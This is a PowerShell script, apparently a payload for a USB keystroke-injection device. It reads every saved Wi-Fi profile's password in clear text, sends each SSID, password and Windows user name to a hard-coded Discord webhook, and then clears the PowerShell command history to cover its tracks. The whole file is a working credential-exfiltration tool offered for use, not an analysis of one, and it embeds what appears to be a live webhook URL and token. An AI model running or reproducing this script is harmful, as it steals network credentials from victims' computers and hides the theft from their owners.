$currentDateTime = Get-Date -Format "dd/MM/yyyy HH:mm"
$username = "Ducky Bot | " + $currentDateTime

$hasPrivileges = $false
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    # Extract the Wi-Fi profile name
    $wlanProfile  = $_.Matches.Value.Trim()
    
    # Get the password for the Wi-Fi profile
    $passw = (netsh wlan show profile $wlanProfile key=clear | Select-String '(?<=Key Content\s+:\s).+').Matches.Value
    
    # Check if the password exists (length > 0)
    if ($passw.Length -gt 0) {
        $hasPrivileges = $true
	$Body = @{
		'username' = $username
		'content' =  "Wlan ssid: " + [string]$wlanProfile + "`rPassword: " + [string]$passw + "`rUser: " + $env:username + "`r----------------------"
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri https://discord.com/api/webhooks/1299047146456088637/g__uJpm_Yj7512QOVyxYE-Cz0Ev_Akzo5UrLyXaCiBLbXMbIpCKevYxgfI3aVWOt6nW2 -Method Post -Body ($Body | ConvertTo-Json)
    }
	
}

if (-Not $hasPrivileges){
	$Body = @{
		'username' = $username
		'content' = "This user seems not to have required privileges or has no saved wifi passwords"
	}
	Invoke-RestMethod -ContentType 'Application/Json' -Uri https://discord.com/api/webhooks/1299047146456088637/g__uJpm_Yj7512QOVyxYE-Cz0Ev_Akzo5UrLyXaCiBLbXMbIpCKevYxgfI3aVWOt6nW2 -Method Post -Body ($Body | ConvertTo-Json)
}

$currentDate = Get-Date -Format "dd/MM/yyyy"

$Body = @{
	'username' = $username
	'content' = "End of wlan borrowing procedure`r--------------------------------`r--------------------------------`r--------------------------------"
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri https://discord.com/api/webhooks/1299047146456088637/g__uJpm_Yj7512QOVyxYE-Cz0Ev_Akzo5UrLyXaCiBLbXMbIpCKevYxgfI3aVWOt6nW2 -Method Post -Body ($Body | ConvertTo-Json)


# Clear the PowerShell command history
Clear-History
